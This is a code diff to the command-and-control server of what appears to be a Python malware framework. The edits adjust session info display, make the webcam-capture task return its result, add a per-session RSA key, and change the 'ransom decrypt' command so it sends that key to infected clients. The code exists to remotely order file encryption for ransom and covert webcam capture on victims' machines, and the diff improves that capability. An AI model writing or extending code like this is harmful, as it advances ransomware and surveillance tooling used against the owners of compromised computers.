@@ -255,7 +255,7 @@ class C2():
                     if info.get(key) and info.get(key) != 'None':
                         if len(str(info.get(key))) > 80:
                             info[key] = str(info.get(key))[:77] + '...'
-                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
+                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(key).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(key, datetime.datetime) else str(int(time.mktime(key.timetuple())))
                         util.display('\x20' * 4, end=',')
                         util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
         else:
@@ -578,9 +578,10 @@ class C2():
                 result = 'Webcam stream ended'
         else:
             client.send_task({"task": "webcam %s" % args})
+            result = 'Webcam capture complete'
             task = client.recv_task()
             result = task.get('result')
-        util.display(result)
+        return result
 
     def session_remove(self, session_id):
         """ 
@@ -659,7 +660,7 @@ class C2():
         """
         if self.current_session:
             if 'decrypt' in str(args):
-                self.current_session.send_task({"task": "ransom decrypt %s" % key.exportKey()})
+                self.current_session.send_task({"task": "ransom decrypt %s" % self.current_session.rsa.exportKey()})
             elif 'encrypt' in str(args):
                 self.current_session.send_task({"task": "ransom %s" % args})
             else:
@@ -764,7 +765,6 @@ class C2():
             globals()['package_handler'].terminate()
             globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
-
     def run(self):
         """ 
         Run C2 server administration terminal
@@ -833,9 +833,10 @@ class Session(threading.Thread):
         self._lock = threading.Lock()
         self._active = threading.Event()
         self._created = time.time()
-        self.connection = connection
         self.id = id
+        self.connection = connection
         self.key = security.diffiehellman(self.connection)
+        self.rsa = security.Cryptodome.PublicKey.RSA.generate(2048)
         try:
             self.info = self.recv_task()
             self.info['id'] = self.id
